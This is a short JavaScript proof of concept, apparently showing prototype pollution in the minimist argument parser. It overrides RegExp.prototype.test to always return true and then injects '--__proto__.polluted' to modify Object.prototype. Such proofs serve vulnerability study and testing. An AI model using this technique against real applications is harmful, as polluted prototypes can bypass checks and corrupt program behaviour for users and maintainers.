RegExp.prototype.test = () => true;
console.log({}.polluted);
require('minimist')('--__proto__.polluted yes'.split(' '));
console.log({}.polluted);